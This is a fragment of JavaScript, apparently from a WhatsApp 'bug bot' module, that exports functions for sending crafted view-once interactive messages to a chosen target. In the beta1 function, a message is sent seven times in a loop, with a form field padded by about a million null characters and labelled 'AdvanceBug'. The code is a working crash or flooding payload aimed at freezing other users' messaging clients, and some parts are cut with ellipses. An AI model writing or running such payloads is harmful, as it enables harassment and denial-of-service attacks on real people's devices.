exports.beta2 = async (rzx, target) => {
    for (let i = 0; i < 7; i++) {
        await rzx.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
...
exports.beta1 = async (rzx, target) => {
    for (let i = 0; i < 7; i++) {
        await rzx.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            ...
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@rzxtzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
...
exports.buk1 = async (rzx, target, text, amount, ptcp = false) => {
    await rzx.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
